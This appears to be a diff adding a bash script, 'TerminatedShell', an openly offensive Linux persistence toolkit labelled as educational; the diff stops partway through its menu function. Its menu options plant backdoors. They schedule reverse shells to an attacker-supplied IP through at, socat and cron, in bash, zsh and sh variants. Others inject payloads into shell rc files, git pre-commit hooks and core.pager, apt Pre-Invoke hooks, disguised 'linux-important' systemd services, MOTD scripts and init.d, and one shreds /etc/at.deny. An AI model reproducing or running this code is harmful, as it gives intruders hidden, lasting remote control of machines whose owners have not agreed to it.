@@ -1,0 +1,648 @@
+#!/usr/bin/env bash
+
+# ----- Global script variables -----
+LC_ALL="en_US.UTF-8" 
+current_shell=$(grep "^$USER:" /etc/passwd | cut -d: -f7)
+random=$(echo $RANDOM | head -c 2)
+
+# --- ANSI colors ---
+BOLD='\033[1m'
+RED='\033[0;91m' # --- Light red ---
+ALERT='\033[1;5;91m' # --- Bold, Blinking & Red ---
+EOC='\033[0m' # --- End of the ANSI color ---
+
+
+line(){ 
+     printf -- '────────%.0s' \ {1..5}
+}
+
+text_banner="
+\t${RED}    .--.${EOC}
+\t${RED}   |x x |   ╔╦╗${EOC}${BOLD}┌─┐┬─┐┌┬┐┬┌┐┌┌─┐┌┬┐┌─┐┌┬┐${EOC}${RED}╔═╗${EOC}${BOLD}┬ ┬┌─┐┬  ┬  ${EOC}
+\t${RED}   |\_/ |    ║ ${EOC}${BOLD}├┤ ├┬┘│││││││├─┤ │ ├┤  ││${EOC}${RED}╚═╗${EOC}${BOLD}├─┤├┤ │  │  ${EOC}
+\t${RED}  // x \ \   ╩ ${EOC}${BOLD}└─┘┴└─┴ ┴┴┘└┘┴ ┴ ┴ └─┘─┴┘${EOC}${RED}╚═╝${EOC}${BOLD}┴ ┴└─┘┴─┘┴─┘${EOC}
+\t${RED} (|  x  | )       Tool for persistence in linux${EOC}
+\t${RED}/'|_ x _/'\   ${ALERT}Use this script for educational purposes.${EOC}
+\t${RED}\___)=(___/${EOC}
+"
+
+options="
+${RED}[ - MAIN FUNCTIONS - ]${EOC}
+${RED}$(line)${EOC}
+${RED}[1]${EOC} ${BOLD}- Manage Users [View|Add|Delete]                      ${EOC}
+$(line)
+${RED}[2]${EOC} ${BOLD}- Shell Config [.bashrc|.zshrc]                       ${EOC}
+$(line)
+${RED}[3]${EOC} ${BOLD}- Scheduler [job|task]                                ${EOC}
+$(line)
+${RED}[4]${EOC} ${BOLD}- Hooks [Apt-get|Git]                                 ${EOC}
+$(line)
+${RED}[5]${EOC} ${BOLD}- Systemd                                             ${EOC}
+$(line)
+${RED}[6]${EOC} ${BOLD}- Message of the Day                                  ${EOC}
+$(line)
+${RED}[7]${EOC} ${BOLD}- Malicious Init                                      ${EOC}
+${RED}$(line)${EOC}
+
+${RED}[ - OTHER FUNCTIONS - ]${EOC}
+${RED}$(line)${EOC}
+${RED}[ cls | clear ]${EOC} -${BOLD} Clear terminal                          ${EOC}
+$(line)
+${RED}[ ? | h | help ]${EOC} -${BOLD} Show options                           ${EOC}
+$(line)
+${RED}[ 0 | q | quit | exit ]${EOC} - ${BOLD}Exit                            ${EOC}
+${RED}$(line)${EOC}
+"
+
+# --- Checks for privileges ---
+priv_check(){
+if [[ $EUID != 0 ]]; then
+    echo -e "\n${RED}[!]${EOC} U are NOT running this script with superuser privileges. \n "
+    read -rp $'\033[0;91m[?]\033[0m Are u sure to continiue \033[0;91mwithout\033[0m SU privileges [y/n] > ' priv_choice
+    if [[ "$priv_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then 
+        priv_status="not_su"
+        echo -e "\n${RED}[!]${EOC} Many functions will ${RED}NOT${EOC} work probably ${RED}without${EOC} SU." && sleep 0.5
+    elif [[ "$priv_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
+        echo -e "\n${RED}[!]${EOC} Exiting... " && sleep 0.5 && exit 0;
+    else [[ -z "$priv_choice" ]];
+        echo -e "\n${RED}[x]${EOC} U didn't choose any option \n${RED}[!]${EOC} Exiting..." && sleep 0.5 && exit 0
+    fi;
+else
+    echo -e "${RED}[!]${EOC} U are running this script with superuser privileges. ${ALERT}Think before u type${EOC}\n "
+    priv_status="is_su"
+fi;
+}
+
+# --- User management [ View | Add | Delete ] --- 
+manage_users() {
+
+echo -e "${RED}$(line)${EOC}"
+echo -e "${RED}[1]${EOC} - ${RED}View${EOC} all users"
+echo -e "$(line)"
+echo -e "${RED}[2]${EOC} - ${RED}Add${EOC} a user"
+echo -e "$(line)"
+echo -e "${RED}[3]${EOC} - ${RED}Delete${EOC} a user"
+echo -e "$(line)"
+echo -e "${RED}[0]${EOC} - ${RED}Return${EOC} to Menu"
+echo -e "${RED}$(line)${EOC}"
+echo 
+read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' user_choice
+
+while true; 
+do
+case $user_choice in
+1)
+    if [[ -r /etc/passwd ]]; then
+        echo -e "\n${RED}[+]${EOC} All Users:"
+        echo -e "$(line)$(line)"
+        awk -F: '{printf "\033[0;91mUsername\033[0m -> %-15s \033[0;91mUID\033[0m -> %-5s \033[0;91mPath\033[0m -> %s\n", $1, $3, $6}' /etc/passwd
+        echo -e "$(line)$(line)"
+
+        # --- Show users with privileged permissions --- 
+        echo -e "\n${RED}[+]${EOC} Users with Privileged Permissions:"
+        echo -e "$(line)$(line)"
+        awk -F: '$3==0 {printf "\033[0;91m[+]\033[0m Username -> \033[1m%s\033[0m UID -> %s Path -> %s\n", $1, $3, $6}' /etc/passwd
+        echo -e "$(line)$(line)"
+        sleep 0.5 && echo && manage_users
+    else
+        echo -e "\n${RED}[x] /etc/passwd${EOC} file is not readable\n" && manage_users
+    fi;;
+2)  
+    if [[ "$priv_status" == "is_su" ]]; then
+        read -rp $'\033[0;91m[*]\e[0m Enter \033[0;91musername\e[0m for the new user > ' user_new
+        read -rp $'\033[0;91m[*]\e[0m Enter \033[0;91mhome\e[0m directory for the new user [press enter for defult path] > ' user_home
+        if [ -z "$user" ]; then
+            user_home="/home/$user_new"
+        fi;
+        read -rp $'\033[0;91m[*]\e[0m Enter \033[0;91mshell\e[0m for the new user [\033[0;91m bash \e[0m / \033[0;91m zsh \e[0m ] > ' user_shell
+        if [[ "$user_shell" =~ ^[Bb][Aa][Ss][Hh]$ || "$user_shell" =~ ^[Zz][Ss][Hh]$ ]]; then
+            sudo useradd -m -d "$user_home" -s "/bin/$user_shell" "$user_new"
+        else 
+            echo -e "${RED}[x]${EOC} ${RED}$user_shell${EOC} unknown shell.";
+            sleep 0.5 && manage_users
+        fi;
+        echo -e "${RED}[+]${EOC} User ${RED}$user_new${EOC} added with shell ${RED}$user_shell${EOC} in ${RED}$user_home${EOC}\n"
+        sleep 0.5 && manage_users
+    else 
+        echo -e "\n${RED}[x]${EOC} U cannot ${RED}add${EOC} user without SU privileges\n"
+        sleep 0.5 && manage_users
+    fi;;
+3)
+    if [[ "$priv_status" == "is_su" ]]; then
+        read -rp $'\033[0;91m[*]\e[0m Enter username to delete > ' del_user
+        sudo userdel "$del_user" && echo -e "${RED}[+]${EOC} User ${RED}$del_user${EOC} deleted."
+        sleep 0.5 && manage_users
+    else
+        echo -e "\n${RED}[x]${EOC} U cannot delete user without SU privileges\n"
+        sleep 0.5 && manage_users
+    fi;;
+0)
+    sleep 0.5 && break && return 0;;
+*)  
+    echo -e "\n${RED}[x]${EOC} Invalid choice.\n"
+    sleep 0.5 && manage_users
+esac;
+done;
+} 
+
+# --- Shell Configuration Persistence File [ bash | zshrc ]  ---
+shell_func(){
+    echo -e "${RED}[*]${EOC} Your current shell is ${RED}$current_shell${EOC}\n"
+    read -rp $'\033[0;91m[*]\e[0m Enter your custom command > ' shell_command
+    # --- Custom shell command based on priv ---
+    if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then
+        echo "$shell_command" | tee -a ~/.bashrc && echo -e "${RED} $shell_command ${EOC} successfuly added to ${RED}~/.bashrc${EOC} config file" && menu
+    elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then
+        echo "$shell_command" | tee -a ~/.zshrc && echo -e "${RED}$shell_command ${EOC} successfully added to ${RED}~/.zshrc${EOC} config file" && menu
+    else
+        echo -e "\n${RED}[x]${EOC} Cannot identify current shell of ${RED}$USER${EOC} user\n" && menu   
+    fi;
+}
+
+# --- Scheduler Persistance [ at | cron ]---
+sched_func(){
+
+echo -e "${RED}$(line)${EOC}"
+echo -e "${RED}[1]${EOC} - At"
+echo -e "$(line)"
+echo -e "${RED}[2]${EOC} - Crontab"
+echo -e "${RED}$(line)${EOC}\n"
+
+while true; 
+do
+read -rp $'\033[0;91m[?]\e[0m Which command to use > ' scheduler_choice
+
+case $scheduler_choice in
+1) # --- At Persistence func (i know this is useless shit-func, contribute if u have any idea)---
+    if [ "$(command -v at)" ]; then
+        echo -e "\n${RED}[+]${EOC} Command \033[0;91mat\e[0m exists on system\n"
+        if [[ -r "/etc/at.deny" && -s "/etc/at.deny" ]]; then
+            echo -e "${RED}[+]${EOC} Here are ${RED}denied users${EOC} of using \033[0;91mat\e[0m command" && tabulate -f simple </etc/at.deny
+            read -rp "\033[0;91m[?]\e[0m Do u want to delete all users (y\n) > " at_user_choice
+            if [[ "$at_user_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+                if [ "$(command -v shred)" ]; then
+                    shred -n 5 -zfuv /etc/at.deny && touch /etc/at.deny && echo -e "\n \033[0;91m/etc/at.deny\e[0m file deleted via \033[0;91mshred\e[0m command and a new empty one has been created "
+                else 
+                    rm -f /etc/at.deny && touch /etc/at.deny && echo -e "\033[0;91m/etc/at.deny\e[0m file deleted via \033[0;91mrm \e[0m command and created a new empty one "
+                fi;
+            else
+                echo "${RED}[x]${EOC} Rolling back to menu" && menu
+            fi;
+        else
+            echo "${RED}[x]${EOC} At's denied users file are ${RED}not found${EOC} or ${RED}not readable${EOC} for current user - ${RED}${USER}${EOC}"
+        fi;
+        read -rp $'\033[0;91m[*]\e[0m Enter IP or domain for basic TCP user custom > ' at_ip
+        if [[ -z "$at_ip" ]]; then 
+            echo "${RED}[x]${EOC} ${RED}IP${EOC} or ${RED}domain${EOC} cannot be empty."
+            sched_func
+        else 
+            if [[ "$at_ip" =~ [a-zA-Z] ]]; then
+                domain_to_ip=$(dig +short "$at_ip" | head -n 1)    
+                if [[ -n "$domain_to_ip" ]]; then
+                at_ip="$domain_to_ip"
+                echo -e "${RED}[+]${EOC} Resolved ${RED}domain${EOC} to ${RED}IP${EOC} > $at_ip"
+            else
+                echo "${RED}[x]${EOC} Unable to resolve the ${RED}domain${EOC} to ${RED}IP${EOC}. Please enter a ${RED}valid IP${EOC} or make sure the domain is resolvable."
+                sched_func
+        fi;fi;fi;
+        read -rp $'\033[0;91m[*]\e[0m Eneter port > ' at_port
+        if [[ "$at_port" =~ [0-65535] && $(command -v socat) ]]; then
+            at_payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$at_ip:$at_port"
+            echo "$at_payload" | at now + 5 minute && echo -e "\n ${RED}$at_payload${EOC} every ${RED}5 minute${EOC} socat payload will be executed."
+            echo -e "${RED}[*]${EOC} Paste this socat listner ${RED}socat file:$(tty),raw,echo=0 TCP-L:$at_port${EOC} command in your machine" 
+            sched_func
+        else
+            echo "${RED}[x]${EOC} ${RED}socat${EOC} command ${RED}not found${EOC} or u entered ${RED}invalid port${EOC} [0-65535]. "
+            sched_func
+        fi;
+    elif [ "$priv_status" == "is_su" ]; then
+        read -rp $'\033[0;91m[?]\e[0m Do u want to install \033[0;91mAt\e[0m command (y\n) > ' at_choice
+        if [[ "$at_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+            sudo apt update -y && sudo apt install at && sudo systemctl enable --now atd && echo -e " ${RED}At${EOC} command ${RED}successuly${EOC} installed & ${RED}atd${EOC} daemon ${RED}enabled${EOC}.\n"
+            sched_func
+        elif [[ "$at_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
+            echo "${RED}[x]${EOC} Going back to main menu "
+            sched_func
+        fi
+    else
+        clear
+        echo -e "${RED}[x]${EOC} ${RED}at${EOC} command is ${RED}not install${EOC} on your system "
+        echo -e "${RED}[x]${EOC} U cannot install ${RED}at${EOC} command ${RED}without SU${EOC} privileges\n " 
+        sched_func 
+    fi;;
+2) # --- Crontab Persistence func ---
+    cron_example="
+    ${BOLD}[*] Example of job definition:${EOC}
+        .---------------- minute (0 - 59)
+        |  .------------- hour (0 - 23)
+        |  |  .---------- day of month (1 - 31)
+        |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+        |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+        |  |  |  |  |
+    ${RED}    *  *  *  *  * user-name   command to be executed${EOC} 
+    ${BOLD}    5  *  *  *  *   root      /bin/nc 127.0.0.1 4444${EOC}     
+    " 
+
+    # --- Checking premissions of crontab stuff (files & dirs) ---
+    # --- Edit this array to your needs ---  
+    cron_stuff=("/etc/crontab" "/var/spool/cron/crontabs/$USER/");
+
+    for cron_stuff_check in "${cron_stuff[@]}"; do
+        sleep 0.3
+        if [ -w "$cron_stuff_check" ]; then
+            echo -e "${RED}[+]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} is ${RED}writeable${EOC}"
+        elif [ -f "$cron_stuff_check" ]; then   
+            echo -e "${RED}[x]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} is ${RED}not writeable${EOC} for current logged user ${RED}${USER}${EOC}."
+        elif [ -d "$cron_stuff_check" ]; then
+                continue
+        else
+            echo -e "${RED}[x]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} not found or ${RED}permission denied${EOC} for current user ${RED}${USER}${EOC} \n\t"    
+            mkdir -p "$cron_stuff_check" && echo -e "${RED}$cron_stuff_check${EOC} has been ${RED}successufly${EOC} created "
+        fi;
+    done
+
+    echo
+
+    # --- Custom crontab command ---
+    read -rp $'\033[0;91m[?]\e[0m Do u want to \033[0;91madd custom command\e[0m to crontab [ y \ n ] > ' cron_choice
+    if [[ "$cron_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+        echo -e "$cron_example" && echo
+        read -rp $'\033[0;91m[*]\e[0m Enter your custom command > ' cron_command
+        # --- Custom cron command based on priv ---
+        if [[ "$priv_status" == "is_su" && -n "$cron_command" ]]; then
+            echo "$cron_command" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC} ${RED}$cron_command${EOC} successfully added to ${RED}${cron_stuff[0]${EOC}}"
+        elif [[ "$priv_status" == "not_su" && -n "$cron_command" ]]; then
+            echo "$cron_command" | crontab - && echo -e "${RED}[+]${EOC} ${RED}$cron_command${EOC} successfully added to ${RED}$USER${EOC}'s crontab"
+        else
+            echo "${RED}[x]${EOC} Something went wrong while ${RED}checking permissions${EOC} or ${RED}input is empty${EOC}"
+            sched_func
+        fi;
+        # --- Default user custom payload based on user's interpretator --- 
+    elif [[ "$cron_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
+        # --- Validation of input ---
+        read -rp $'\033[0;91m[*]\e[0m Enter IP or domain for basic TCP > ' cron_ip
+        if [[ -z "$cron_ip" ]]; then 
+            echo "${RED}[x]${EOC} IP or domain cannot be empty."
+            sched_func
+        else 
+            if [[ "$cron_ip" =~ [a-zA-Z] ]]; then
+                domain_to_ip=$(dig +short "$cron_ip" | head -n 1)    
+                if [[ -n "$domain_to_ip" ]]; then
+                cron_ip="$domain_to_ip"
+                echo -e "${RED}[+]${EOC} Resolved domain to IP: ${RED}$cron_ip${EOC}"
+            else
+                echo "${RED}[x]${EOC} Unable to resolve the ${RED}domain to IP${EOC}. Please enter a ${RED}valid IP${EOC} or make sure the ${RED}domain is resolvable${EOC}."; 
+                sched_func
+        fi; fi; fi;
+
+        read -rp $'\033[0;91m[*]\e[0m Enter PORT > ' cron_port
+        if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then 
+            # --- Bash rev shell payload ---
+                cron_payload="* * * * * $USER bash -c '0<&33-;exec 33<>/dev/tcp/$cron_ip/$cron_port;sh <&33 >&33 2>&33'"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
+                    sched_func   
+                else
+                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
+                    sched_func
+                fi;
+            # --- Zsh rev shell payload ---
+            elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then 
+                cron_payload="* * * * * $USER zsh -c 'zmodload zsh/net/tcp && ztcp $cron_ip $cron_port && zsh >&\$REPLY' 2>&\$REPLY' 0>&\$REPLY' > /dev/null &"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
+                    sched_func
+                else
+                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
+                    sched_func
+                fi;
+            # --- Sh rev shell payload ---
+            elif [ "$current_shell" == "/bin/sh" ] || [ "$current_shell" == "/usr/bin/sh" ] ; then 
+                cron_payload="* * * * * $USER 0<&196;exec 196<>/dev/tcp/$cron_ip/$cron_port; sh <&196 >&196 2>&196"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
+                    sched_func
+                else
+                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
+                    sched_func
+                fi;
+        else
+            # --- Giving link of cheatsheet if user's interpertator is unknown --- 
+            echo -e "${RED}[x]${EOC} ${RED}Reverse-shell${EOC} command for ${RED}$USER's${EOC} default shell${RED}(\"$current_shell\")${EOC} is ${RED}unknown${EOC}. ${RED}Supported${EOC} shells are - ${RED}sh, bash & zsh.${EOC} \n"
+            echo -e "${RED}[!]${EOC} ${RED}Take a look${EOC} at this cheet-sheet & ${RED}manually add${EOC} it to crontab based on your shell - ${RED}(\"$current_shell\")${EOC}\n" 
+            echo -e "${RED}[*]${EOC} https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ \n"
+            sched_func
+        fi;
+    else
+        echo -e "\n${RED}[x]${EOC} No option has been seleted\n" && sleep 0.5
+        sched_func
+    fi;;
+0|[Qq]|[Qq][Uu][Ii][Tt])
+    echo -e "${RED}[+]${EOC} Going back to main menu"
+    sleep 0.5 && break && return 0;;
+*) 
+    echo -e "${RED}[x]${EOC} Enter valid option [0-2]\n"
+    sched_func;;
+esac;
+done;
+}
+
+# --- Hooks presistance [ Apt pre-invoke and Git pre-commit ] ---
+hooks_func(){
+echo -e "${RED}$(line)${EOC}"
+echo -e "[1] Git hooks & config"
+echo -e "$(line)"
+echo -e "[2] Apt-get hooks"
+echo -e "${RED}$(line)${EOC}\n"
+
+read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' hook_choice
+case $hook_choice in
+1)
+    echo 
+    echo -e "${RED}[*]${EOC} Searching for ${RED}.git${EOC} folders in ${RED}/home/${EOC} directories\n"    
+    # --- Finding all .git folders of all users & storing them in an array ---
+    mapfile -t git_folders < <(find /home/ -type d -name ".git") && \
+    echo -e "\n${RED}[+]${EOC} Found accessable ${RED}.git${EOC} folders for user ${RED}${USER}${EOC}:" # --- Display users founded .git folders ---
+    for ((n_folder=0; n_folder<${#git_folders[@]}; n_folder++)); do
+        echo -e "$(line)$(line)"
+        echo -e "${RED}[$((n_folder+1))]${EOC} - ${git_folders[$n_folder]}"
+    done;
+
+    echo
+    while true;
+    do
+      read -rp $'\033[0;91m[*]\e[0m Choose a .git folder to take futher actions > ' folder_num
+      if [[ "$folder_num" =~ ^[1-9][0-9]*$ && "$folder_num" -le "${#git_folders[@]}" ]]; then
+        selected_folder="${git_folders[$((folder_num-1))]}" 
+        cd "$selected_folder" || { echo -e "\n${RED}[x]${EOC} ${RED}$selected_folder${EOC} is not accessible for user (${RED}$USER${EOC})\n"; hooks; } 
+        echo -e "\n${RED}[+]${EOC} Current directory > ${RED}$(pwd)${EOC}" && \
+        echo -e "\n${RED}[+]${EOC} Last 3 commits of repo:\n" && \
+        git log -n 3;
+        break
+      else 
+        echo -e "\n${RED}[x]${EOC} Invalid .git folder\n"
+      fi
+    done
+    echo
+    
+    echo -e "${RED}$(line)${EOC}"
+    echo -e "${RED}[1]${EOC} Custom payload to ${RED}pre-commit hook${EOC}"
+    echo -e "$(line)"
+    echo -e "${RED}[2]${EOC} Custom payload to ${RED}git config file${EOC}"
+    echo -e "${RED}$(line)${EOC}\n"
+
+    while true; 
+    do
+        read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' git_choice
+        if [[ "$git_choice" -eq 1 ]]; then 
+            echo -e "${RED}[*]${EOC} All avalable hooks in $selected_folder\n"
+            cd "$selected_folder"/hooks && "${RED}<(ls -la .)${EOC}"
+            pre_commit_file="pre-commit.sh"
+            if [[ -f "$pre_commit_file" ]]; then
+                echo -e "${RED}[+]${EOC} File \"$pre_commit_file\" exists"
+            elif [[ -f "pre-commit.sample" ]]; then
+                mv pre-commit.sample "$pre_commit_file" && chmod +x "$pre_commit_file" && \
+                echo -e "${RED}[+]${EOC} Found sample of ${RED}pre-commit${EOC} file, ${RED}renamed into .sh${EOC} & ${RED}made it executable${EOC}"
+            else
+                echo -e "${RED}[x]${EOC} Pre-commit hooks not found.\n" 
+            fi
+            read -rp $'\033[0;91m[*]\e[0m Enter your custom payload for pre-commit hook > ' pre_commit_payload
+            if [[ -n "$pre_commit_payload" ]]; then
+                echo -e "${RED}[+]${EOC} Adding custom pre-commit git hook\n"
+                echo -e "#!/bin/bash\n$pre_commit_payload" >> "$pre_commit_file" && \
+                chmod +x "$pre_commit_file" && \
+                echo -e "${RED}[+]${EOC} Pre-commit Git hook created successfully.\n" && break;
+            else 
+                echo -e "${RED}[x]${EOC} Payload cannot be empty\n"
+            fi
+    elif [[ "$git_choice" -eq 2 ]]; then
+        cd "$selected_folder" || { echo "${RED}[x]${EOC} $selected_folder is not accessible for user ${USER} "; hooks; }
+        if [[ -f $(pwd)/config ]] && [[ -w $(pwd)/config ]] && [[ -r $(pwd)/config ]]; then
+            echo -e "${RED}[+]${EOC} Git config file exits for current user ${USER} & have r/w premissions\n"
+            read -rp $'\033[0;91m[*]\e[0m Enter your custom payload > ' git_config_payload
+            if [[ -n "$git_config_payload" ]]; then
+                git_config_content=$(cat "$(pwd)/config")
+                if [[ ! "$git_config_content" =~ pager ]]; then # --- Checking if pager entry already exists ---
+                    echo -e "${RED}[*]${EOC} Adding payload to git config file \n"
+                    echo -e "\n[core]\n\tpager = $git_config_payload" >> "$(pwd)/config" && \
+                    echo -e "${RED}[+]${EOC} Payload successfuly added to \"$(pwd)/config\" file"
+                else # --- Adding user custom payload to existing pager entry --- 
+                    echo -e "${RED}[*]${EOC} Modifing pager configuration option\n"
+                    sed -i "s|pager =|pager = $git_config_payload|" "$(pwd)/config" && \
+                    echo -e "${RED}[+]${EOC} Pager configuration option modified successfuly" && hooks
+                fi
+            else 
+                echo -e "${RED}[x]${EOC} Payload cannot be empty\n" && hooks
+            fi
+        else
+            echo -e "${RED}[x]${EOC} Git config file not found or current user ${USER} don't have r/w premissions" && hooks    
+        fi;
+        
+    else
+        echo -e "\n${RED}[x]${EOC} Invalid option\n"
+    fi
+    done;;
+2)
+    if [[ "$priv_status" == "is_su" ]]; then
+        read -rp $'\033[0;91m[*]\e[0m Enter custom payload/command > ' apt_payload
+        if [[ -z "$apt_payload" ]]; then
+            echo -e "${RED}[+]${EOC} Apt config directory exitst\n"
+            sudo touch "/etc/apt/apt.conf.d/'$random'aptget"
+            echo "APT::Update::Pre-Invoke {\"$apt_payload\";};" | sudo tee "/etc/apt/apt.conf.d/'$random'aptget" > /dev/null
+            echo -e "${RED}[+]${EOC} Payload (\"'$apt_payload'\") successfuly implented in \"/etc/apt/apt.conf.d/'$random'aptget\""
+        else
+            echo -e "${RED}[x]${EOC} Payload cannot be empty \n" && hooks
+        fi;
+    else
+        echo -e "${RED}[x]${EOC} U need SU privileges to add custom payload to apt-get pre-invoke\n" && \
+        hooks
+    fi;;
+*)
+    echo -e "${RED}[x]${EOC} Invalid option\n" && hooks;;
+esac
+}
+
+# --- Systemd persistence [ User/SU level]---
+systemd_func(){
+# --- Storing all admin systemd unit paths into "admin_paths" array ---
+mapfile -t admin_units < <(systemd-analyze unit-paths --system) 
+admin_paths=$(printf "${RED}[+]${EOC} %s\n" "${admin_units[@]}")
+# --- Storing all user systemd unit paths into "user_paths" array --- 
+mapfile -t user_units < <(systemd-analyze unit-paths --user)
+user_paths=$(printf "${RED}[+]${EOC} %s\n" "${user_units[@]}")
+# --- here diff uses process substitution to compare via strings not via temp files(diff -y a.txt b.txt) ---
+echo -e "\tSystem units paths\t\t\t\t\t\tUsers units paths " && diff -y <(echo "$admin_paths") <(echo "$user_paths") 
+
+if [[ "$priv_status" == "is_su" ]]; then
+    echo -e "${RED}[+]${EOC} U are SU your payload will be implanted in systemd level "
+    read -rp $'\033[0;91m[*]\e[0m Enter custom path to script or enter custom payload > ' su_systemd_payload
+    if [[ -z "$su_systemd_payload" ]]; then
+        echo -e "\n${RED}[x]${EOC} Payload cannot be empty \n" && menu
+    else
+        su_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
+# --- simple systemd service with custom payload ---
+cat << EOF > "$su_systemd_file"
+
+[Unit]
+Description=Linux Important Service N$random
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$su_systemd_payload
+Restart=always
+RestartSec=120
+
+[Install]
+WantedBy=default.target
+EOF
+    sudo systemctl daemon-reload && \
+    systemctl enable "$random"-linux-important.service && \
+    systemctl start "$random"-linux-important.service && \
+    echo -e "\n${RED}[+]${EOC} (\"ExecStart=$su_systemd_payload\") successufly implanted in \"$su_systemd_file\" and stared";
+    fi
+else
+    echo -e "\n${RED}[!]${EOC} Current user (\"$USER\") cannot implant system deamon service on system level \n"
+    read -rp $'\033[0;91m[*]\e[0m Enter custom path to script or enter custom payload > ' user_systemd_payload
+    if [[ -z "$user_systemd_payload" ]]; then
+        echo -e "\n${RED}[x]${EOC} Payload cannot be empty \n" && menu
+    else
+        user_systemd_file="$HOME/.config/systemd/user/'$random'-linux-important.service"
+cat << EOF > "$user_systemd_file"
+[Unit]
+Description=Linux Important Service N$random
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$user_systemd_payload
+Restart=always
+RestartSec=120
+
+[Install]
+WantedBy=default.target
+EOF
+    systemctl --user daemon-reload && \
+    systemctl enable "$random"-linux-important.service && \
+    systemctl start "$random"-linux-important.service && \
+    echo -e "\n${RED}[+]${EOC} (\"ExecStart=$user_systemd_payload\") successufly implanted in \"$user_systemd_file\" and stared";
+fi; fi;
+}
+
+# --- MOTD persistence ---  
+motd_func(){
+if [[ $priv_status == "is_su" ]]; then
+    read -rp $'\033[0;91m[*]\e[0m Enter your custom payload to \033[0;91mMOTD\e[0m config file > ' motd_payload
+    if [[ -n $motd_payload ]]; then
+        echo -ne "#!/bin/bash\n$motd_payload" >> /etc/update-motd.d/20-pers && \
+        chmod +x /etc/update-motd.d/20-pers && \
+        echo -e "${RED}[+]${EOC} Payload ${RED}$motd_payload${EOC} has been ${RED}successfuly${EOC} added to ${RED}/etc/update-motd.d/20-pers${EOC}" && \
+        exit 0 || echo -e "\n${RED}[x]${EOC} Something went wrong while adding payload\n";
+    else
+        echo -e "\n${RED}[x]${EOC} Your payload is ${RED}empty${EOC} or ${RED}/etc/update-motd.d${EOC} not found" && return 0;
+    fi
+else
+    echo -e "${RED}[x]${EOC} U cannot edit ${BOLD}MOTD${EOC} file without SU privileges\n" && menu
+fi
+}
+
+# --- Malicious init persistence ---
+malint_func(){
+if [[ "$priv_status" == "is_su" ]]; then
+read -rp $'\033[0;91m[*]\e[0m Enter path to your script > ' mal_file_path
+cat << EOF > '/etc/init.d/$random-important-init'
+#!/bin/sh
+
+start_daemon() {
+    start-stop-daemon --start --pidfile /var/run/init-daemon.pid --exec "\$$mal_file_path" || { echo -e "\n${RED}[x]${EOC} Cannot add custom malisious init path; };
+}
+
+case "\$1" in
+  start)
+    start_daemon
+    ;;
+esac
+EOF
+else
+    echo -e "${RED}[x]${EOC} U need SU privileges to add malicious init\n" && menu
+fi
+}
+
+# --- Logs [ spoof | delete ] ---
+logs(){
+ echo 1
+}
+
+closing()
+{
+    echo -e "\n\n${RED}[+]${EOC} Closing program...\n" && \
+    echo -e "\n${RED}[!]${EOC} ${BOLD}Don't forget to check git repo${EOC} (${RED}https://github.com/anonimidin/terminatedshell${EOC})" && \
+    sleep 0.3 && exit 0;
+}
+trap closing SIGINT SIGTSTP
+
+banner() {
+echo -e "$text_banner"
+echo -e "$options"
+
+if (( $(tput cols) < 155 )); then
+    echo -e "${BOLD}${RED}[*]${EOC} Your width of terminal is ${RED}$(tput cols)${EOC}" 
+    echo -e "${BOLD}${RED}[*]${EOC} For best reading performance columns must be ${RED}155+${EOC}\n"
+fi;
+}
+
+# ----- Menu Function -----
+menu(){
+# --- Options ---
+read -rp $'\033[0;91m[*] [TERMINATED_SHELL] >\e[0m ' choice
+case $choice in    
+    1) sleep 0.5; echo && manage_users;; # --- line 74  ---
+    2) sleep 0.5; echo && shell_func;;   # --- line 83  ---
+    3) sleep 0.5; echo && sched_func;;   # --- line 92  ---
+    4) sleep 0.5; echo && hooks_func;;   # --- line 102 ---
+    5) sleep 0.5; echo && systemd_func;; # --- line 111 ---
+    6) sleep 0.5; echo && motd_func;;    # --- line 126 ---
+    7) sleep 0.5; echo && malint_func;;  # --- line 133 ---
+    8) sleep 0.5; echo && logs;; 
+    
